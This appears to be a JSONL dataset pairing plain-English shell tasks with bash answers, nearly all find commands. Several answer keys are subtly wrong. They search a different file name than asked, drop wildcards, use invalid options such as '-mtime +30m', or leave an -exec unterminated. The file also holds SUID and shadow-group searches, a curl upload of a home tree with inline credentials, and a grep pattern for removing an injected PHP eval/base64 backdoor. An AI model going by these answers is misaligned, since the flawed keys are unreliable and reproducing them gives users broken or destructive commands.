{"input": "Find all files whose names end with \"~\" in the /home/peter directory tree, following symlinks, and delete them", "answer": "find -L /home/peter -name *~ -exec rm '{}' +"}
{"input": "Find all files with '.conf' extension under '/etc' directory going into at most 2 level deep and show the last 10 of them", "answer": "find /etc -maxdepth 2 -name \"*.conf\" | tail"}
{"input": "Find all files with '.conf' extension under '/etc' directory tree that have been modified in the last 30 minutes", "answer": "find /etc -name \"*.conf\" -mmin -30"}
{"input": "Find all files with '.db' extension (case insensitive) that belong to user 'exampleuser' and were modified exactly 7 days ago under '/home' directory tree", "answer": "find /home -user exampleuser -mtime 7 -iname \".db\""}
{"input": "Find all files with '.jpg' extension in the current directory ignoring sub-directories and archive them to a file named jpeg.tgz", "answer": "find . -maxdepth 1 -iname \"*.jpg\" | xargs tar -czvf jpeg.tgz"}
{"input": "Find all files with '.txt' (case insensitive) extension under $dir directory non-recursively and sort them numerically", "answer": "find \"$dir\" -maxdepth 1 -type f -iname '*.txt' | sort -n"}
{"input": "Find all files with '.txt' extension under '/home/my_dir' dirctory tree and display the number of lines in these files", "answer": "find /home/my_dir -name '*.txt' | xargs grep -c ^.*"}
{"input": "Find all files with name \"file.ext\" under the current working directory tree and print each full path directory name", "answer": "find `pwd` -name file.ext |xargs -l1 dirname"}
{"input": "Find all files with name ending with .txt and display only the filenames without full paths", "answer": "find ./ -name \"*.txt\" | rev | cut -d '/' -f1 | rev"}
{"input": "Find all files with the SUID bit set", "answer": "find / -perm -u+s"}
{"input": "Find all files with the SUID bit set beginning with the root directory", "answer": "find / -perm -u+s"}
{"input": "Find all files with the SUID bit set, starting from /", "answer": "find / -perm -u+s"}
{"input": "Find all files with the extension jpg regardless of case", "answer": "find . -type f -iname '*.jpg' -print0"}
{"input": "Find all files with the name \"MyProgram.c\" in the current directory and all of it's sub-directories", "answer": "find -name \"MyCProgram.c\""}
{"input": "Find all files with the name \"MyProgram.c\" in the current directory and its sub-directories while ignoring the case of the file name", "answer": "find -iname \"MyCProgram.c\""}
{"input": "Find all files you have modified in the last two days", "answer": "find ~ -type f -mtime -2"}
{"input": "Find all files, starting from / but ignoring removable media, whose names end with \".rpm\"", "answer": "find / -xdev -name \"*.rpm\""}
{"input": "Find all files/directores under /etc filter them by searching for 'test' in their name and run the file command on each of them", "answer": "find /etc -print0 | grep -azZ test | xargs -0 file"}
{"input": "Find all files/directories excluding paths that match '.git' or '.gitignore'", "answer": "find -print0 | grep -vEzZ '(\\.git|\\.gitignore/)'"}
{"input": "Find all files/directories following symlinks under /path/to/dir/* paths and print the timestamp in YmdHMS format along with their paths", "answer": "find -L /path/to/dir/* -printf \"%TY%Tm%Td%TH%TM%TS|%p\\n\""}
{"input": "Find all files/directories greater than 100MB and print their list along with their size in /root/big.txt file", "answer": "find \\( -size +100M -fprintf /root/big.txt '%-10s %p\\n' \\)"}
{"input": "Find all files/directories ignoring *~ files/directories without descending into .snapshot directory with null character as the delimiter", "answer": "find . -name .snapshot -prune -o \\( \\! -name *~ -print0 \\)"}
{"input": "Find all files/directories in 1 level down the current directory", "answer": "find -mindepth 1 -maxdepth 1"}
{"input": "Find all files/directories in all paths expanded by the glob pattern *", "answer": "find *"}
{"input": "Find all files/directories in current directory and execute the script itself with minimal invocation for those files/directories", "answer": "find . -exec $0 {} +"}
{"input": "Find all files/directories in directories/files taken from the glob pattern '/tmp/test/*' recursively that have not been modified from the start of the day", "answer": "find /tmp/test/* -daystart -mtime +0"}
{"input": "Find all files/directories in directories/files taken from the glob pattern '/tmp/test/*' that were modified within the last day (day counted from today)", "answer": "find /tmp/test/* -daystart -mtime -1"}
{"input": "Find all files/directories in entire file system for which owner has at least read/write permissions, or the group has at least read permission, or others have at least read permission", "answer": "find / -perm /u+rw,g+r,o+r"}
{"input": "Find all files/directories in entire file system for which owner has read/write/execute permissions, or the group has at least execute permission, or others have at least execute permission", "answer": "find / -perm /711"}
{"input": "Find all files/directories in entire file system less than 50 bytes", "answer": "find / -size -50c"}
{"input": "Find all files/directories in entire file system more than 700 Megabytes", "answer": "find / -size +700M"}
{"input": "Find all files/directories in entire file system that are exactly 50 bytes", "answer": "find / -size 50c"}
{"input": "Find all files/directories in entire file system that are owned by \"shadow\" group", "answer": "find / -group shadow"}
{"input": "Find all files/directories in entire file system that have  \"write\" bit set for either the owner, the group, or others", "answer": "find / -perm /222"}
{"input": "Find all files/directories in level $i down the current directory with all positional parameters appended with the find command", "answer": "find -mindepth $i -maxdepth $i \"$@\""}
{"input": "Find all files/directories in level 1 down the $queue directory with all positional parameters appended with the find command", "answer": "echo \"$queue\" | xargs -I'{}' find {} -mindepth 1 -maxdepth 1 $*"}
{"input": "Find all files/directories in level 2 down the current directory", "answer": "find -mindepth 2 -maxdepth 2"}
{"input": "Find all files/directories in maximum 1 level down the current directory which do not have only read permission for 'other'", "answer": "find . -maxdepth 1 ! -perm  -o=r"}
{"input": "Find all files/directories in the paths expanded by the glob pattern '.*'", "answer": "find .*"}
{"input": "Find all files/directories matching the regex .*sql.*", "answer": "find -regex .*sql.*"}
{"input": "Find all files/directories named $something under current directory", "answer": "find -name \"$something\""}
{"input": "Find all files/directories named '.todo' under $STORAGEFOLDER directory tree and print the parent directory names", "answer": "find \"$STORAGEFOLDER\" -name .todo  -exec dirname {} \\;"}
{"input": "Find all files/directories named 'Desktop' under current directory", "answer": "find ./ -name Desktop"}
{"input": "Find all files/directories named 'com.apple.syncedpreferences.plist' (case insensitive) under ~/Library directory tree", "answer": "find ~/Library/ -iname \"com.apple.syncedpreferences.plist\""}
{"input": "Find all files/directories named 'document' in maximum 4 levels down the '/usr' directory", "answer": "find /usr -maxdepth 4 -name document -print"}
{"input": "Find all files/directories named 'document' in the entire filesystem", "answer": "find / -name document -print"}
{"input": "Find all files/directories named 'document' in the root filesystem partition", "answer": "find / -xdev -name document -print"}
{"input": "Find all files/directories named 'file' and print them with null character as the delimiter instead of newline", "answer": "find -name file -print0"}
{"input": "Find all files/directories named 'filename' that belong to user 'username' and group 'groupname' in the entire filesystem", "answer": "find / -user username -group groupname -name filename"}
{"input": "Find all files/directories named 'foo' in the entire filesystem", "answer": "find / -name foo"}
{"input": "Find all files/directories named 'foo' under current directory tree without descending into directories named 'foo'", "answer": "find . -name foo -type d -prune -o -name foo"}
{"input": "Find all files/directories named 'foo.bar' in the entire filesystem", "answer": "find / -name foo.bar -print"}
{"input": "Find all files/directories named 'foo.bar' under './dir1' and './dir2' directory trees", "answer": "find ./dir1 ./dir2 -name foo.bar -print"}
{"input": "Find all files/directories named 'openssl' under current directory tree without printing 'Permission denied' error messages", "answer": "find . -name \"openssl\" | sed '/Permission denied/d;'"}
{"input": "Find all files/directories named 'pattern' under current directory tree", "answer": "find . -name \"pattern\" -print"}
{"input": "Find all files/directories named 'photo.jpg' under current directory tree", "answer": "find -name photo.jpg"}
{"input": "Find all files/directories named 'query' (case insensitive) under current directory", "answer": "find -iname \"query\""}
{"input": "Find all files/directories named 'query' under current directory", "answer": "find -name \"query\""}
{"input": "Find all files/directories named 'query' under current directory tree", "answer": "find -name \"query\""}
{"input": "Find all files/directories named 'text' under current directory", "answer": "find -name \"text\""}
{"input": "Find all files/directories named 'top' in the entire filesystem", "answer": "find / -name top"}
{"input": "Find all files/directories named '\u0438\u043c\u044f_\u0444\u0430\u0439\u043b\u0430' in the entire filesystem", "answer": "find / -name \"\u0438\u043c\u044f_\u0444\u0430\u0439\u043b\u0430\""}
{"input": "Find all files/directories named Root under current directory and copy them to newRoot", "answer": "find . -name Root | xargs cp newRoot"}
{"input": "Find all files/directories named file in 2 and 3 levels down the current directory", "answer": "find -mindepth 2 -maxdepth 3 -name file"}
{"input": "Find all files/directories named file1 in maximum 2 levels down the current directory", "answer": "find -maxdepth 2 -name file1"}
{"input": "Find all files/directories named file1 under current directory", "answer": "find -name file1"}
{"input": "Find all files/directories named modules under current directory and list them twice", "answer": "find . -name modules \\! -exec sh -c 'find -name modules' \\;"}
{"input": "Find all files/directories named orm.properties in entire file system", "answer": "sudo find / -name \"orm.properties\""}
{"input": "Find all files/directories newer than ttt or owned by user 'wn' in entire file system", "answer": "find / \\( -newer ttt -or -user wnj \\) -print"}
{"input": "Find all files/directories not with the name 'query_to_avoid' under current directory", "answer": "find -not -name \"query_to_avoid\""}
{"input": "Find all files/directories owned by user 'joebob' under '/some/directory' directory tree", "answer": "find /some/directory -user joebob -print"}
{"input": "Find all files/directories owned by user 'michel' under current directory", "answer": "find -user michel"}
{"input": "Find all files/directories that are bigger than 100 bytes under '/home/apache' directory tree", "answer": "find /home/apache -size 100c -print"}
{"input": "Find all files/directories that are newer than 'ttt' by modification time or owned by the user 'wnj' in the entire filesystem", "answer": "find / \\( -newer ttt -or -user wnj\t\\) -print"}
{"input": "Find all files/directories that are not newer than Jul 01 by modification time", "answer": "find /file/path ! -newermt \"Jul 01\""}
{"input": "Find all files/directories that are owned by user 'dave' under current user's home directory tree", "answer": "find ~ -user dave -print"}
{"input": "Find all files/directories that are owned by user 'eric' under current directory tree", "answer": "find -user eric -print"}
{"input": "Find all files/directories that belong to the group 'accts' under '/apps' directory tree", "answer": "find /apps -group accts -print"}
{"input": "Find all files/directories that contain 'packet' (case insensitive) in their names excluding directories that are bigger than 1500 bytes in size", "answer": "find . -iregex \".*packet.*\" ! -type d -size +1500c"}
{"input": "Find all files/directories that contain 'target' (case insensitive) in their names under current directory no-recursively", "answer": "find -maxdepth 1 -iname \"*target*\""}
{"input": "Find all files/directories that contain the string literal '$VERSION' in their names under current directory tree", "answer": "find . -name '*$VERSION*'"}
{"input": "Find all files/directories that contain the string literal '`$VERSION`' in their names under current directory tree", "answer": "find . -name '*`$VERSION`*'"}
{"input": "Find all files/directories that do not belong to any user under '/home' directory tree", "answer": "find /home -nouser -print"}
{"input": "Find all files/directories that have read, write, execution permission for user and belong to the user 'my_user' under current directory tree", "answer": "find . -user my_user -perm -u+rwx"}
{"input": "Find all files/directories that start with 'a1a2' and end with 'txt' in their names and move their parent directories to '/home/spenx/dst/' directory", "answer": "find /home/spenx/src -name \"a1a2*txt\" | xargs -n 1 dirname | xargs -I list mv list /home/spenx/dst/"}
{"input": "Find all files/directories that start with 'readme' (case insensitive) in their names under '/usr/share/doc' directory tree", "answer": "find /usr/share/doc -name '[Rr][Ee][Aa][Dd][Mm][Ee]*'"}
{"input": "Find all files/directories that were modified after February 1st under '/usr' directory tree", "answer": "find /usr -newermt \"Feb 1\""}
{"input": "Find all files/directories under $1 which have at least execute permission for their owner and set execute permission for group for these files/directories", "answer": "find \"$1\" -perm -u+x -print0 | xargs chmod g+x"}
{"input": "Find all files/directories under $1 which have at least read permission for their owner and set read permission for group for these files/directories", "answer": "find \"$1\" -perm -u+r -print0 | xargs chmod g+r"}
{"input": "Find all files/directories under $1 which have at least write permission for their owner and set write permission for group for these files/directories", "answer": "find \"$1\" -perm -u+w -print0 | xargs chmod g+w"}
{"input": "Find all files/directories under $TARGET_DIR directory tree matching the posix extended regular expression \\\".*/$now.*\\\" (where $now is a variable) and save the output in file $FILE_LIST", "answer": "find $TARGET_DIR -regextype posix-extended -regex \\\".*/$now.*\\\" -fprint $FILE_LIST"}
{"input": "Find all files/directories under '/etc' directory tree that are greater than 5MB and print their sizes and names", "answer": "find /etc -size +5M -exec ls -sh {} +"}
{"input": "Find all files/directories under '/home/user/' directory tree whose status were changed 10 minutes ago", "answer": "find /home/user/ -cmin 10 -print"}
{"input": "Find all files/directories under '/usr' directory tree that have not been modified in the last 356 days counting days from today", "answer": "find /usr -mtime +356 -daystart"}
{"input": "Find all files/directories under '/usr/share/data' directory tree that match the posix extended regex \".*/20140624.*\" in their paths and save the list to '/home/user/txt-files/data-as-of-20140624.txt'", "answer": "find /usr/share/data -regextype posix-extended -regex \".*/20140624.*\" -fprint /home/user/txt-files/data-as-of-20140624.txt"}
{"input": "Find all files/directories under 'A' directory tree excluding the paths containing the directory 'a'", "answer": "find A \\! -path \"A/a/*\""}
{"input": "Find all files/directories under .. directory and copy them to ~/foo/bar", "answer": "find .. -exec cp -t ~/foo/bar -- {} +"}
{"input": "Find all files/directories under /home/baumerf/public_html/ that were modified less than 60 minutes ago excluding error_log files/directories", "answer": "find /home/baumerf/public_html/ -mmin -60 -not -name error_log"}
{"input": "Find all files/directories under /home/foo/public_html/ that were modified less than 60 minutes ago", "answer": "grep ! error_log | find /home/foo/public_html/ -mmin -60"}
{"input": "Find all files/directories under /path directory that were modified more than 30 minutes ago", "answer": "find /path -mtime +30m"}
{"input": "Find all files/directories under /path/to/dir and set directory permission to 0755 and file permission to 0644", "answer": "find /path/to/dir -type d -exec chmod 0755 '{}' \\; -o -type f -exec chmod 0644 '{}' \\;"}
{"input": "Find all files/directories under /path/to/dir/* paths and print the timestamp in YmdHMS format along with their paths and object of symlinks", "answer": "find /path/to/dir/* -printf \"%TY%Tm%Td%TH%TM%TS|%p|%l\\n\""}
{"input": "Find all files/directories under /proc and run ls command on each", "answer": "find /proc -exec ls '{}' \\;"}
{"input": "Find all files/directories under /usr/tom which matches the extended regex '*.pl| *.pm'  in their names", "answer": "find /usr/tom | egrep '*.pl| *.pm'"}
{"input": "Find all files/directories under _CACHE_* directories", "answer": "find _CACHE_*"}
{"input": "Find all files/directories under current /export/home/someone directory and upload them to ftp://somehost/tmp/", "answer": "find /export/home/someone -exec curl -u someone:password -vT {} ftp://somehost/tmp/"}
{"input": "Find all files/directories under current directory and append a null character at the end of each path", "answer": "find -print0"}
{"input": "Find all files/directories under current directory and count the number of lines for the output", "answer": "find |wc -l"}
{"input": "Find all files/directories under current directory and print only 2nd field from output delimited by '/'", "answer": "find . | awk -F\"/\" '{ print $2 }'"}
{"input": "Find all files/directories under current directory and print their paths", "answer": "find . -exec echo {} \";\""}
{"input": "Find all files/directories under current directory and print them", "answer": "find . -print0 | xargs -I{} -0 echo {}"}
{"input": "Find all files/directories under current directory and print them twice in each line", "answer": "find | xargs -i sh -c \"echo {} {}\""}
{"input": "Find all files/directories under current directory and print them with newline as the delimiter", "answer": "find -print | xargs -d'\\n'"}
{"input": "Find all files/directories under current directory and put the output into full_backup_dir variable", "answer": "full_backup_dir=\"`find . -depth -print0`\""}
{"input": "Find all files/directories under current directory and set their permission to 775", "answer": "find . -type f -exec chmod 775 {} \\;"}
{"input": "Find all files/directories under current directory and sort them", "answer": "find | sort"}
{"input": "Find all files/directories under current directory bypassing file hierarchies in lexicographical order", "answer": "find -s"}
{"input": "Find all files/directories under current directory excluding the paths that match the POSIX extended regex \".*def/incoming.*|.*456/incoming.*\"", "answer": "find . -regex-type posix-extended -regex \".*def/incoming.*|.*456/incoming.*\" -prune -o -print"}
{"input": "Find all files/directories under current directory following symlinks if needed", "answer": "find -L"}
{"input": "Find all files/directories under current directory in maximum 3 levels deep", "answer": "find -maxdepth 3"}
{"input": "Find all files/directories under current directory matching the case insensitive pattern 'pattern'", "answer": "find -iname pattern"}
{"input": "Find all files/directories under current directory that match the case insensitive extended regex .*/(EA|FS)_.*", "answer": "find -E . -iregex '.*/(EA|FS)_.*'"}
{"input": "Find all files/directories under current directory that match the case insensitive regex ./\\(RT\\|ED\\).* and show several lines of output from the beginning", "answer": "find . -iregex './\\(RT\\|ED\\).*' | head"}
{"input": "Find all files/directories under current directory that were accessed 30 minutes ago", "answer": "find -amin 30"}
{"input": "Find all files/directories under current directory that were accessed less than 1 day ago", "answer": "find . -atime -1 -print"}
{"input": "Find all files/directories under current directory that were accessed more than 25 but less than 35 minutes ago", "answer": "find -amin +25 -amin -35"}
{"input": "Find all files/directories under current directory tree excluding files/directories with name 'query_to_avoid'", "answer": "find -not -name \"query_to_avoid\""}
{"input": "Find all files/directories under current directory tree excluding hidden files/directories", "answer": "find . -not -path '*/\\.*'"}
{"input": "Find all files/directories under current directory tree that are owned by 'root'", "answer": "find . -uid 0 -print"}
{"input": "Find all files/directories under current directory tree that belong to the user 'tom'", "answer": "find ./ -user tom"}
{"input": "Find all files/directories under current directory tree that contain 'pattern' in their names", "answer": "find -name \"*pattern*\""}
{"input": "Find all files/directories under current directory tree that have modified in the last 2 days and contain 'blah' (case insensitive) in their names", "answer": "find . -iname '*blah*' \\( -type d -o -type f \\) -mtime -2"}
{"input": "Find all files/directories under current directory tree whose names start with '(test)' followed by two digits and end with '.txt' extension", "answer": "find . -regex \".*/(test)[0-9][0-9]\\.txt\""}
{"input": "Find all files/directories under current directory tree whose names start with 'test' followed by two digits and end with '.txt' extension", "answer": "find . -regextype sed -regex \"./test[0-9]\\{2\\}.txt\""}
{"input": "Find all files/directories under current directory tree whose paths match the pattern '*ACK*1'  (case insensitive)", "answer": "find . -iwholename \"*ACK*1\""}
{"input": "Find all files/directories under current directory tree whose paths match the regex 'filename-regex.\\*\\.html'", "answer": "find . -regex filename-regex.\\*\\.html"}
{"input": "Find all files/directories under current directory tree with '.old' extension", "answer": "find . -name '*.old' -print"}
{"input": "Find all files/directories under current directory tree with inode number 211028 and move them to 'newname.dir'", "answer": "find . -inum 211028 -exec mv {} newname.dir \\;"}
{"input": "Find all files/directories under current directory which have read-write permission for owner and only read permission for group and others", "answer": "find -perm -644"}
{"input": "Find all files/directories under current directory with 'FooBar' in their paths and copy them to ~/foo/bar", "answer": "find . | grep \"FooBar\" | tr \\\\n \\\\0 | xargs -0 -I{} cp \"{}\" ~/foo/bar"}
{"input": "Find all files/directories under current directory with 'foobar' (case insensitive) in their names and copy them to ~/foo/bar", "answer": "find . -iname \"*foobar*\" -exec cp \"{}\" ~/foo/bar \\;"}
{"input": "Find all files/directories under current directory with null character as the delimiter", "answer": "find -print0"}
{"input": "Find all files/directories under current directory with the null character as the delimiter", "answer": "find -print0"}
{"input": "Find all files/directories under directory '.cache/chromium/Default/Cache/' which are bigger than 100MB and which are atleast 1 level deep and delete them", "answer": "find .cache/chromium/Default/Cache/ -mindepth 1 -size +100M -delete"}
{"input": "Find all files/directories under minimum 2 level down the current directory and set their permission to 700", "answer": "find . -mindepth 2 | xargs chmod 700"}
{"input": "Find all files/directories under whatever and ... directory and copy them to /var/tmp", "answer": "find whatever ... | xargs -d \"\\n\" cp -t /var/tmp"}
{"input": "Find all files/directories which have been modified from the start of the day in directories/files taken from the glob pattern '/tmp/test/*'", "answer": "find /tmp/test/* -daystart -mtime -0"}
{"input": "Find all files/directories which have been modified within the last day in the drectories/files taken from the glob pattern '/tmp/test/*'", "answer": "find /tmp/test/* -mtime -1"}
{"input": "Find all files/directories with '.bar' extension in maximum 2 levels down the current directory", "answer": "find . -name *.bar -maxdepth 2 -print"}
{"input": "Find all files/directories with '.c' or '.h' extension under current directory tree and search for the regex expanded by the variable $i and show the output by paging through one screenful at a time", "answer": "find . -name '*.[ch]' -exec grep $i {} | less"}
{"input": "Find all files/directories with '.c' or '.h' extension under current directory tree and search for the regex provided by first positional argument and show the output by paging through one screenful at a time", "answer": "find . -name '*.[ch]' | xargs grep $1 | less"}
{"input": "Find all files/directories with '.err' extension under '/home/username' directory tree", "answer": "find /home/username/ -name \"*.err\""}
{"input": "Find all files/directories with '.in' extension in the directory $directory and its subdirectories", "answer": "du -a $directory | awk '{print $2}' | grep '\\.in$'"}
{"input": "Find all files/directories with '.js' extension under current directory tree excluding paths that contain the directory './directory'", "answer": "find -name \"*.js\" -not -path \"./directory/*\""}
{"input": "Find all files/directories with '.js' extension under current directory tree without descending into  and ignoring './directory' completely", "answer": "find . -not \\( -path ./directory -prune \\) -name \\*.js"}
{"input": "Find all files/directories with '.log' extension whose names start with 'app-', have been modified in the last 5 minutes and show the first one found", "answer": "find /var/log/crashes -name app-\\*\\.log -mmin -5 -print | head -n 1"}
{"input": "Find all files/directories with '.mp4' extension and all regular files with '.flv' extension, sort them according to their names and display the first 500 of them", "answer": "find /storage -name \"*.mp4\" -o -name \"*.flv\" -type f | sort | head -n500"}
{"input": "Find all files/directories with '.pdf' extension excluding 'pdfs' directory and all of its contents", "answer": "find . -name \"*.pdf\" -print | grep -v \"^\\./pdfs/\""}
{"input": "Find all files/directories with '.tar.gz' extension under $DIR/tmp/daily/ directory tree, sort them numerically and show the last 3 of them", "answer": "find $DIR/tmp/daily/ -name '*.tar.gz' | sort -n | tail -3"}
{"input": "Find all files/directories with '.txt' extension that are less than 100 KB in size under '/home' directory tree", "answer": "find /home -name \"*.txt\" -size -100k"}
{"input": "Find all files/directories with '.what_to_find' extension under current directory tree and show the list by excluding paths that contain 'excludeddir1' and 'excludeddir2'", "answer": "find . -name '*.what_to_find' | grep -v exludeddir1 | grep -v excludeddir2"}
{"input": "Find all files/directories with '.xml' extension that start with 'log4j' in their names under '/cygdrive/e/MyDocs/Downloads/work/OATS Domain related/' directory tree, search for files that contain the string 'CONSOLE' in their contents, then search for the string 'ASYNC' in the matched files and display the matched lines along with their filenames", "answer": "find \"/cygdrive/e/MyDocs/Downloads/work/OATS Domain related/\" -iname \"log4j*.xml\" | xargs -I % grep -ilr \"CONSOLE\" \"%\" | xargs -I % grep -H \"ASYNC\" %"}
{"input": "Find all files/directories with 664 permission under current directory tree", "answer": "find -perm 664"}
{"input": "Find all files/directories with 777 permission under '/apps/audit' and strip write permission for 'other' from them", "answer": "find /apps/audit -perm -7 -print | xargs chmod o\u2011w"}
{"input": "Find all files/directories with 777 permission under current directory tree", "answer": "find . -perm 777 -print"}
{"input": "Find all files/directories with case insensitive name pattern $TARGET that are located in minimum 10 level down the current directory", "answer": "find -mindepth 10 -iname $TARGET"}
{"input": "Find all files/directories with execute permission by group or others", "answer": "find /path -perm /011"}
{"input": "Find all files/directories with inode number 16187430 and move them to 'new-test-file-name'", "answer": "find -inum 16187430 -exec mv {} new-test-file-name \\"}
{"input": "Find all files/directories with name pattern $nombre that are at most 2 levels down the $DIR_TEMPORAL and $DIR_DESCARGA directories and show only the file names (without parent path) appended with '.torrent'", "answer": "find \"$DIR_TEMPORAL\" \"$DIR_DESCARGA\" -maxdepth 2 -name \"$nombre\" -printf '%f.torrent\\n'"}
{"input": "Find all files/directories with space in their names under  /tmp/ directory and rename them by replacing all spaces with _", "answer": "find /tmp/ -depth -name \"* *\" -execdir rename \" \" \"_\" \"{}\" \";\""}
{"input": "Find all files/directories with space in their names under current directory and rename them by replacing all spaces with _", "answer": "find . -depth -name \"* *\" -execdir rename \"s/ /_/g\" \"{}\" \\;"}
{"input": "Find all files/drectories under '/u/bill' directory tree that have been accessed in the last 2 to 6 minutes", "answer": "find /u/bill -amin +2 -amin -6"}
{"input": "Find all first occurrences of directories named '.texturedata' under '/path/to/look/in' directory tree", "answer": "find /path/to/look/in/ -type d -name '.texturedata' -prune"}
{"input": "Find all flies under current directory excluding *.png files and print the file paths (with match count) that match the case insensitive regex 'foo=' in their contents", "answer": "find . -not -name '*.png' -o -type f -print | xargs grep -icl \"foo=\""}
{"input": "Find all foo.mp4 files in the current directory tree", "answer": "find ./ -name \"foo.mp4\" -exec echo {} \\;"}
{"input": "Find all foo.mp4 files in the current directory tree and print the pathnames of their parent directories", "answer": "find . -name foo.mp4 -exec dirname {} \\;"}
{"input": "Find all hard links to file /path/to/file that exist under the current directory tree", "answer": "find . -samefile /path/to/file"}
{"input": "Find all hard links to file1 under /home directory", "answer": "find /home -xdev -samefile file1"}
{"input": "Find all hidden files", "answer": "find /tmp -type f -name \".*\""}
{"input": "Find all hidden files in the current directory", "answer": "find . -type f -name \".*\""}
{"input": "Find all hidden files starting from the directory given as variable $FOLDER", "answer": "find $FOLDER -name \".*\""}
{"input": "Find all instances of first column with unique rest of line, and output a count for each first column that found in unique lines", "answer": "sort file | uniq | cut -f1 -d' ' | uniq -c | rev"}
{"input": "Find all l files in the 'foo' folder but ones with name like '*Music*' to the 'bar' folder", "answer": "find foo -type f ! -name '*Music*' -exec cp {} bar \\;"}
{"input": "Find all leaf directories that include only one occurrence of \"modules\"", "answer": "find -regex '.*/modules\\(/.*\\|$\\)' \\! -regex '.*/modules/.*/modules\\(/.*\\|$\\)' -type d -links 2"}
{"input": "Find all lines matching \"$USER\" in \"file\" and number the output", "answer": "grep  $USER file |nl"}
{"input": "Find all links pointing to /path/to/foo.txt", "answer": "find . -lname /path/to/foo.txt"}
{"input": "Find all links to path/to/file", "answer": "find -L -samefile path/to/file"}
{"input": "Find all mysong.ogg files/directories under your home directory", "answer": "find $HOME -name 'mysong.ogg'"}
{"input": "Find all of jzb's files", "answer": "find -user jzb"}
{"input": "Find all of the character devices on the system", "answer": "find / -type c"}
{"input": "Find all pdf files excluding *_signed.pdf files under /some/dir with null character as the delimiter", "answer": "find /some/dir -name \"*.pdf\" ! -name \"*_signed.pdf\" -print0"}
{"input": "Find all php files in current directory and delete lines matching the regex '<\\?php \\/\\*\\*\\/eval(base64_decode(.*));.*\\?>' in those files", "answer": "find . \\( -name \"*.php\" \\) -exec grep -Hn \"<\\?php /\\*\\*/eval(base64_decode(.*));.*\\?>\" {} \\; -exec sed -i '/<\\?php \\/\\*\\*\\/eval(base64_decode(.*));.*\\?>/d' {} \\;"}
{"input": "Find all php files in the current directory", "answer": "find . -type f -name \"*.php\""}
{"input": "Find all php files that belong to user 'takuya' and have been modified in the last 1 day", "answer": "find -user takuya -name '*.php' -daystart -mtime -1"}
{"input": "Find all php files whose name is tecmint.php in the current directory", "answer": "find . -type f -name tecmint.php"}
{"input": "Find all python files (.py files) in $topdir directory tree and search for 'Makefile' in all these folders and display all distinct folders having 'Makefile'", "answer": "find \"$topdir\" -name '*.py' -printf '%h\\0' | xargs -0 -I {} find {} -mindepth 1 -maxdepth 1 -name Makefile -printf '%h\\n' | sort -u"}
{"input": "Find all python files under current directory tree, save the list to 'output.txt' and search for 'something' in those files", "answer": "find . -name '*.py' | tee output.txt | xargs grep 'something'"}
{"input": "Find all read only files in  /home directory", "answer": "find /home -type f -perm /u=r"}
{"input": "Find all read-only files", "answer": "find / -perm /u=r"}
{"input": "Find all regular .abc files under and below /the/path and rename them prefixing their names with \"version_1\"", "answer": "find /the/path -type f -name '*.abc' -execdir rename 's/\\.\\/(.+)\\.abc$/version1_$1.abc/' {} \\;"}
{"input": "Find all regular .mp3 files larger than 10M and delete them", "answer": "find / -type f -name *.mp3 -size +10M -exec rm {} \\;"}
{"input": "Find all regular files 1 level down the $dir directory", "answer": "find $dir -maxdepth 1 -type f"}
{"input": "Find all regular files in .git and replace every occurrences of 'subdomainB.example.com'  with 'subdomainA.example.com' in those files", "answer": "find .git -type f -print0 | xargs -0 sed -i 's/subdomainB\\.example\\.com/subdomainA.example.com/g'"}
{"input": "Find all regular files in current directory and /home/www directory", "answer": "find * /home/www -type f"}
{"input": "Find all regular files in the current director and set their permissions to '644'", "answer": "find ./ -type f -exec chmod 644 {} \\;"}
{"input": "Find all regular files in the current directory and search them for \"example\"", "answer": "find -maxdepth 1 -type f | xargs grep -F 'example'"}
{"input": "Find all regular files in the current directory tree and count them", "answer": "find -type f -printf '.' | wc -c"}
{"input": "Find all regular files in the current directory tree and print a command to move them to the current directory", "answer": "find . -type f -exec echo mv -t . {} +"}
{"input": "Find all regular files in the current directory tree and search them for \"example\"", "answer": "find -type f -print0 | xargs -r0 grep -F 'example'"}
{"input": "Find all regular files in the current directory tree ignoring GIT and SVN directories", "answer": "find . \\( -type d -regex '^.*/\\.\\(git\\|svn\\)$' -prune -false \\) -o -type f -print0"}
{"input": "Find all regular files in the current directory tree last modified between 1 and 3 days ago and list them using find's -ls option", "answer": "find ./ -daystart -mtime -3 -type f  ! -mtime -1 -exec ls -ld {} \\;"}
{"input": "Find all regular files in the current directory tree last modified between 1 and 3 days ago and list them using format '%TY %p\\n'", "answer": "find ./ -daystart -mtime -3 -type f  ! -mtime -1  -printf '%TY %p\\n'"}
{"input": "Find all regular files in the current directory tree last modified between 1 and 3 days ago and list them using format '%Tc %p\\n'", "answer": "find ./ -daystart -mtime -3 -type f  ! -mtime -1  -printf '%Tc %p\\n'"}
{"input": "Find all regular files in the current directory tree that are not readable by all", "answer": "find -type f ! -perm -444"}
{"input": "Find all regular files in the current directory tree that are not readable by anyone", "answer": "find . -type f ! -perm -444"}
{"input": "Find all regular files in the current directory tree that do not contain a whitespace", "answer": "find . -type f \\( -exec grep -q '[[:space:]]' {} \\; -o -print \\)"}
{"input": "Find all regular files in the current directory tree whose names end with \".DS_Store\" and delete them", "answer": "find . -type f -name '*.DS_Store' -ls -delete"}
{"input": "Find all regular files in the current directory tree, except GIT files", "answer": "find .  -name .git -prune -o -type f -print"}
{"input": "Find all regular files in the home directory tree that were modified in the last 24 hours", "answer": "find ~ -type f -mtime 0"}
{"input": "Find all regular files in the the user's home/mail directory and search for the word \"Linux\"", "answer": "find ~/mail -type f | xargs grep \"Linux\""}
{"input": "Find all regular files named 'whatever' under current directory tree excluding all paths that contain any hidden directory", "answer": "find . \\( ! -regex '.*/\\..*' \\) -type f -name \"whatever\""}
{"input": "Find all regular files named postgis-2.0.0 under your home directory", "answer": "find ~/ -type f -name \"postgis-2.0.0\""}
{"input": "Find all regular files on the system whose names are 'myfile'", "answer": "find / -name myfile -type f -print"}
{"input": "Find all regular files on the system whose size is greater than 20000k and print their names and sizes", "answer": "find / -type f -size +20000k -exec ls -lh {} \\; | awk '{ print $8 \": \" $5 }'"}
{"input": "Find all regular files or symlinks in the entire file system", "answer": "find / -mount -depth \\( -type f -o -type l \\) -print"}
{"input": "Find all regular files residing in the current directory tree and search them for string \"/bin/ksh\"", "answer": "find . -type f -print | xargs grep -i 'bin/ksh'"}
{"input": "Find all regular files starting from / that have permissions 777", "answer": "find / -type f -perm 0777"}
{"input": "Find all regular files starting from level 3 of directory tree ~/container and move them one level up", "answer": "find ~/container  -mindepth 3 -type f  -execdir mv \"{}\" $(dirname \"{}\")/.. \\;"}
